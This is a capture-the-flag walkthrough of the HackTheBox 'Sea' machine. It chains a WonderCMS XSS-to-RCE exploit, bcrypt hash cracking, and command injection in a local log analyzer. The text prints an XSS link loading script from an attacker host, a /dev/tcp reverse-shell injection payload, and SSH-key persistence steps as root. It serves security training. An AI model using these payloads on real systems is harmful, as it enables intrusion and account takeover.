---
title: Sea HackTheBox
author: Saad
date: 2024-12-23 00:00:00 +0500
categories:
  - HackTheBox
tags:
  - xss
  - xss2rce
  - wonder cms
  - command injection
  - cve-2023-41425
  - hackthebox
image: sea.png
media_subpath: /assets/img/sea-htb
---

## Box Info:
Sea was an easy simple box featuring WonderCMS which is vulnerable to XSS and can be leveraged to RCE via uploading a malicious module. Enumerating system further, A database file can be found which contains a hash, can be cracked and used for user `amay`. For root access, command injection can be exploited on locally running system monitoring application.

## Recon

### nmap

```bash
➜  Sea nmap -sCV -oN scan 10.10.11.28 -T4 --min-rate=1000
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-23 04:23 EST
Nmap scan report for 10.10.11.28
Host is up (0.24s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 e3:54:e0:72:20:3c:01:42:93:d1:66:9d:90:0c:ab:e8 (RSA)
|   256 f3:24:4b:08:aa:51:9d:56:15:3d:67:56:74:7c:20:38 (ECDSA)
|_  256 30:b1:05:c6:41:50:ff:22:a3:7f:41:06:0e:67:fd:50 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Sea - Home
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.92 seconds
```

`22/TCP` & `80/TCP` as usual, Interesting thing that `httponly` flag is not set.

### Site

Site is just some bike themed thingy.

![](site.png)

Interestingly clicking on `How To Participate` takes to `/how-to-participate`.

> How can I participate?
>To participate, you only need to send your data as a participant through [contact](http://sea.htb/contact.php). Simply enter your name, email, age and country. In addition, you can optionally add your website related to your passion for night racing.

Clicking on `contact` leads to `http://sea.htb/contact.php`, Adding it to `/etc/hosts` file shows a contact forum.

```sh
10.10.11.28 sea.htb
```
![](contact.png)

I tried basic xss payloads thinking that `httponly` flag is not set so I might be able to get a cookie. But nothing on my webserver!

## Shell as www-data

### Enumeration

When opened the banner image in new tab it reveals the path of the theme, `http://sea.htb/themes/bike/img/velik71-new-logotip.png`.
Directory enumeration on `http://sea.htb/themes/bike/` reveals some interesting information towards whats running.

```
➜  Sea feroxbuster --url http://sea.htb/themes/bike
  ...<SNIP>...
301      GET        7l       20w      235c http://sea.htb/themes/bike => http://sea.htb/themes/bike/
301      GET        7l       20w      239c http://sea.htb/themes/bike/css => http://sea.htb/themes/bike/css/
301      GET        7l       20w      239c http://sea.htb/themes/bike/img => http://sea.htb/themes/bike/img/
404      GET        0l        0w     3341c http://sea.htb/themes/bike/skins
200      GET        1l        1w        6c http://sea.htb/themes/bike/version
200      GET       21l      168w     1067c http://sea.htb/themes/bike/LICENSE
404      GET        0l        0w     3341c http://sea.htb/themes/bike/README.md
200      GET        1l        9w       66c http://sea.htb/themes/bike/summary
[###########>--------] - 3m     16564/30000   80/s    http://sea.htb/themes/bike/
[##########>---------] - 3m     16031/30000   78/s    http://sea.htb/themes/bike/css/
[##########>---------] - 3m     16449/30000   80/s    http://sea.htb/themes/bike/img/ 
🚨 Caught ctrl+c
```
`/LICENSE` tells it's an MIT LICENSE for the theme, `/version` is `3.2.0`.

![](license.png)

When [googled](https://www.google.com/search?q=bike+theme+turboblack), it leads to this page of [WonderCMS](https://www.wondercms.com/community/viewforum.php?f=22&start=25) showing that this theme was approved for it.

Also, Looking at `README.md` reveals that it's WonderCMS.

![](readme.png)

At this point I don't really know the version of WonderCMS, but I assume it's the one in `/version` or could be the `bike theme`'s version.
But googling around [WonderCMS v.3.2.0](https://www.google.com/search?q=wonder+cms+v.3.2.0) leads to these two interesting results.

![](search.png)

### Exploitation

```
https://github.com/prodigiousMind/CVE-2023-41425/blob/main/exploit.py
```

How does the script works:
> 1. It takes 3 arguments:
   - URL: where WonderCMS is installed (no need to know the password)
   - IP: attacker's Machine IP
   - Port No: attacker's Machine PORT
> 2. It generates an xss.js file (for reflected XSS) and outputs a malicious link.
> 3. As soon as the admin (logged user) opens/clicks the malicious link, a few background requests are made without admin acknowledgement to upload a shell via the upload theme/plugin functionality.
> 4. After uploading the shell, it executes the shell and the attacker gets the reverse connection of the server.

![Image from POC github](https://private-user-images.githubusercontent.com/76691910/280818482-5aa2d248-ae5a-4d13-bf48-62b8ee20342d.png?jwt=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJnaXRodWIuY29tIiwiYXVkIjoicmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbSIsImtleSI6ImtleTUiLCJleHAiOjE3MzQ5MzQzMzEsIm5iZiI6MTczNDkzNDAzMSwicGF0aCI6Ii83NjY5MTkxMC8yODA4MTg0ODItNWFhMmQyNDgtYWU1YS00ZDEzLWJmNDgtNjJiOGVlMjAzNDJkLnBuZz9YLUFtei1BbGdvcml0aG09QVdTNC1ITUFDLVNIQTI1NiZYLUFtei1DcmVkZW50aWFsPUFLSUFWQ09EWUxTQTUzUFFLNFpBJTJGMjAyNDEyMjMlMkZ1cy1lYXN0LTElMkZzMyUyRmF3czRfcmVxdWVzdCZYLUFtei1EYXRlPTIwMjQxMjIzVDA2MDcxMVomWC1BbXotRXhwaXJlcz0zMDAmWC1BbXotU2lnbmF0dXJlPTI1ZDQzOGFkMGVlNzI3MmFkMTFjYzUxOTZhOTgxNWUyZWE3NGRkYjg1MTFlYzlhM2YxZTQzN2I3ZGUwNWM3MTYmWC1BbXotU2lnbmVkSGVhZGVycz1ob3N0In0.ie8jCDUKAf_tZ_7xlYlUUBgDIfKzVDtMyC5Gi18_9Pc)

Enough talking about the script, back to exploiting it.

That was a good PoC but I'll use this [one](https://github.com/0xDTC/WonderCMS-4.3.2-XSS-to-RCE-Exploits-CVE-2023-41425/blob/master/CVE-2023-41425) written in bash by [0xDTC](https://github.com/0xDTC).

_He re-wrote couple Python PoC into bash, cool guy_.

I'll save the bash script as `exploit` and `chmod +x exploit` it.

```bash
➜  Sea ./exploit
Usage: ./exploit <loginURL> <IP_Address> <Port>
Example: ./exploit http://localhost/wondercms/loginURL 192.168.29.165 5252
```
Running the script:
```bash
➜  Sea ./exploit http://sea.htb/loginURL 10.10.14.29 9001
[+] Preparing to download the reverse shell zip file from: http://10.10.14.29:8000/main.zip
[+] Reverse shell downloaded and saved as rev.php
[+] Updating rev.php with provided IP: 10.10.14.29 and Port: 9001
[+] rev.php updated with the correct IP and Port.
[+] Creating ZIP file with rev.php...
[+] main.zip created successfully.
[+] File created: xss.js
[+] Setting up reverse shell listener:
Use the following command in your terminal: nc -nvlp 9001
[+] Send the following malicious link to the admin:
http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.29:8000/xss.js"></script><form+action="
Waiting for the admin to trigger the payload.
[+] Port 8000 is available.
[+] Starting a simple HTTP server to serve the XSS payload...
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
Now, I'll go back to `http://sea.htb/contact.php` and submit that xss payload.

![](submit.png)

It fetches the `xss.js` then makes 4 more requests.

```console
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.11.28 - - [23/Dec/2024 06:22:51] "GET /xss.js HTTP/1.1" 200 -
10.10.11.28 - - [23/Dec/2024 06:23:01] "GET /main.zip HTTP/1.1" 200 -
10.10.11.28 - - [23/Dec/2024 06:23:02] "GET /main.zip HTTP/1.1" 200 -
10.10.11.28 - - [23/Dec/2024 06:23:02] "GET /main.zip HTTP/1.1" 200 -
10.10.11.28 - - [23/Dec/2024 06:23:03] "GET /main.zip HTTP/1.1" 200 -
```
On the other hand, there is a shell!!

```bash
➜  ~ nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.29] from (UNKNOWN) [10.10.11.28] 51858
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
**Upgrade the Shell**

```console
$ script -qc /bin/bash /dev/null
www-data@sea:/$ export TERM=kitty
export TERM=kitty
www-data@sea:/$ ^Z
[1]  + 19267 suspended  nc -nvlp 9001
➜  ~ fix
[1]  + 19267 continued  nc -nvlp 9001

www-data@sea:/$
```
`fix` is an alias I have in my `.zshrc` which is just `alias fix='stty raw -echo;fg`.

### Shell as amay

### Enumeration

There are following users on the system:
```sh
www-data@sea:/var/www/sea/data$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
amay:x:1000:1000:amay:/home/amay:/bin/bash
geo:x:1001:1001::/home/geo:/bin/bash
```

Looking around the system, a `database.js` can be found under `/var/www/sea/data` which happens to be the `WonderCMS`'s database file.
`database.js`

```js
www-data@sea:/var/www/sea/data$ cat database.js
           ...<SNIP>...
        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
        "lastLogins": {
            "2024\/12\/23 06:22:52": "127.0.0.1",
            "2024\/12\/22 23:50:03": "127.0.0.1",
            "2024\/12\/22 23:49:32": "127.0.0.1",
            "2024\/12\/22 23:49:02": "127.0.0.1",
            "2024\/07\/31 15:17:10": "127.0.0.1"
            ...<SNIP>...
```
The hash can be cracked with `hashcat` or `john`, Just need to remove the backslashes.
`$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q`

### crack the hash
I'll crack it with hashcat, but itt found 4 matches, I'll use `3200` mode.

```bash
➜  Sea hashcat hash /usr/share/wordlists/rockyou.txt
    ...<SNIP>...

      # | Name                                                       | Category
  ======+============================================================+======================================
   3200 | bcrypt $2*$, Blowfish (Unix)                               | Operating System
  25600 | bcrypt(md5($pass)) / bcryptmd5                             | Forums, CMS, E-Commerce
  25800 | bcrypt(sha1($pass)) / bcryptsha1                           | Forums, CMS, E-Commerce
  28400 | bcrypt(sha512($pass)) / bcryptsha512                       | Forums, CMS, E-Commerce
    ...<SNIP>...
```
Cracking....
```bash
➜  Sea hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
      ....<SNIP>....

Session..........: hashcat
Status...........: Running
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
Time.Started.....: Mon Dec 23 06:39:08 2024 (1 min, 0 secs)
Time.Estimated...: Fri Dec 27 18:58:53 2024 (4 days, 12 hours)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       37 H/s (4.79ms) @ Accel:4 Loops:16 Thr:1 Vec:1
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 2192/14344385 (0.02%)
Rejected.........: 0/2192 (0.00%)
Restore.Point....: 2192/14344385 (0.02%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: doctor -> brittany1
Hardware.Mon.#1..: Util: 86%

$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
....<SNIP>....
```

So, the password `mychemicalromance` is either for amay or geo.
But I'll use [nxc](https://www.netexec.wiki/ssh-protocol/authentication) to validate it.

```console
➜  Sea nxc ssh sea.htb -u users -p mychemicalromance
SSH         10.10.11.28     22     sea.htb          [*] SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
SSH         10.10.11.28     22     sea.htb          [-] root:mychemicalromance
SSH         10.10.11.28     22     sea.htb          [-] geo:mychemicalromance
SSH         10.10.11.28     22     sea.htb          [+] amay:mychemicalromance  Linux - Shell access!
```
### su/SSH

**su**
```console
www-data@sea:/var/www/sea/data$ su - amay
Password:
amay@sea:~$ wc user.txt
 1  1 33 user.txt
```

**SSH**
```console
➜  Sea ssh amay@sea.htb
amay@sea.htb's password:
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

...<SNIP>...
amay@sea:~$ wc user.txt
 1  1 33 user.txt
```

## Shell as root

### Enumeration

I'll start of by basic enumeration, tried looking for SetUIDs but didn't find anything.
```console
amay@sea:~$ find / -perm -u=s -type f 2>/dev/null
/snap/core20/2318/usr/bin/chfn
/snap/core20/2318/usr/bin/chsh
/snap/core20/2318/usr/bin/gpasswd
/snap/core20/2318/usr/bin/mount
/snap/core20/2318/usr/bin/newgrp
/snap/core20/2318/usr/bin/passwd
/snap/core20/2318/usr/bin/su
/snap/core20/2318/usr/bin/sudo
/snap/core20/2318/usr/bin/umount
/snap/core20/2318/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/2318/usr/lib/openssh/ssh-keysign
/snap/snapd/21759/usr/lib/snapd/snap-confine
/opt/google/chrome/chrome-sandbox
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/sudo
/usr/bin/umount
/usr/bin/su
/usr/bin/fusermount
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/at
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
```
### localhost:8080
When I tried looking for open ports on local, interestingly on local there is `TCP/8080` and `TCP/59281` open.
```console
amay@sea:~$ ss -tupln
Netid     State       Recv-Q      Send-Q           Local Address:Port            Peer Address:Port     Process
udp       UNCONN      0           0                127.0.0.53%lo:53                   0.0.0.0:*
udp       UNCONN      0           0                      0.0.0.0:68                   0.0.0.0:*
tcp       LISTEN      0           511                    0.0.0.0:80                   0.0.0.0:*
tcp       LISTEN      0           4096                 127.0.0.1:8080                 0.0.0.0:*
tcp       LISTEN      0           10                   127.0.0.1:59281                0.0.0.0:*
tcp       LISTEN      0           4096             127.0.0.53%lo:53                   0.0.0.0:*
tcp       LISTEN      0           128                    0.0.0.0:22                   0.0.0.0:*
tcp       LISTEN      0           128                       [::]:22                      [::]:*
```
Curling the `59281` doesn't return anything so I guess it's useless, But `8080` returns `Unauthorized access`.
INTERESTING
```
amay@sea:~$ curl 127.0.0.1:59281
amay@sea:~$ curl 127.0.0.1:8080
Unauthorized access
```
I'll prtfwd it to my local machine and take a look at it in my browser.
```sh
➜  Sea ssh -L 8080:localhost:8080 amay@sea.htb
```
It presents with a HTTP auth prompt.

![](http_auth.png)

So I assume `amay` is the user and `mychemicalromance` is the password for it.

The site is about system monitoring where user can analyze the logs, But it presenting "(Developing)" in the name of it hints that it's still in development and there might be vulnerabilities.

![](local80x2.png)

### command injection

When clicked on `Analyze` it shows the access logs of `apache2`. 
![](logs.png)

I'll take a look on the request in Burp.

```
POST / HTTP/1.1
Host: localhost:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: http://localhost:8080/
Content-Type: application/x-www-form-urlencoded
Content-Length: 57
Origin: http://localhost:8080
DNT: 1
Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
Connection: close
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Sec-GPC: 1
Priority: u=0, i

log_file=%2Fvar%2Flog%2Fapache2%2Faccess.log&analyze_log=
```
It reads the `/var/log/apache2/access` as I guessed earlier.
I tried reading `/etc/passwd` and it did work!

![](etcpasswd.png)

Now that I can read file, didn't found anything under `/root/.ssh/` while trying to read `/root/root.txt` where webapp didn't return anything useful but
`No suspicious traffic patterns detected in /root/root.txt.`, I assume it only reads file with special characters.

When tried `/root/root.txt;id` it worked?!

![](root.png)

To get a shell, I'll use the simple bash revshell and url encode it.

`bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.29/9001+0>%261'`

It should look something like this
```
log_file=/root/root.txt;bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.29/9001+0>%261'&analyze_log=
```
Send the request and on other hand there is root shell!

![](shell.png)

After a second or 2 it exits itself, Tried different payloads but nothing.
To get a proper shell, We can write our public ssh key in root's `authorized_keys`.

![](dotpub.png)

I'll generate a pair of `ssh keys` and write it to `authorized_keys`.

```bash
➜  Sea ssh-keygen
Generating public/private rsa key pair.
Enter file in which to save the key (id_rsa):
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
The key fingerprint is:
SHA256:xz4BdpnSBIFJFEwmhGy2onF/nLBJCGmpeAogMWzMucM simon@parrot
The key's randomart image is:
+---[RSA 3072]----+
|*+ooo=*+oo.      |
|=X=  o+  o o     |
|O+.o    + =      |
|*E= o  . =       |
|o*.o = .S +      |
|o   + +  o .     |
|     .    o      |
|           .     |
|                 |
+----[SHA256]-----+
```
![](wrotekey.png)

Now I can just simply `SSH` as root and read the `root.txt`.
```console
➜  Sea ssh -i ~/.ssh/id_rsa root@sea.htb
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-190-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro
  ...<SNIP>...
root@sea:~# wc root.txt
 1  1 33 root.txt
root@sea:~# cat root.txt
flag{g1t_gud_4nd_g1t_fl4g_by_yours3lf}
```